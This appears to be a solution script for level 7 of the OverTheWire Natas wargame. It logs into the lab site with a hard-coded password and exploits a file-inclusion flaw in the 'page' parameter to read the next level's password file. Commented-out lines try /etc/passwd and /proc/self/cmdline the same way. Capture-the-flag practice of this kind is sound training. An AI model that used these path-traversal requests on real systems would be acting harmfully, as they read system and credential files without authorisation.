#!/usr/bin/env python

import requests
import re

username = 'natas7'
password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.session()

#response = session.get(url + "index.php?page=../../../../etc/passwd", auth = (username, password))
response = session.get(url + "index.php?page=/etc/natas_webpass/natas8", auth = (username, password))
#response = session.get(url + "index.php?page=../../../../proc/self/cmdline", auth = (username, password)) #see how program is run
content = response.text

print(content)
#print(re.findall('<!--The password for natas3 is (.*) -->', content))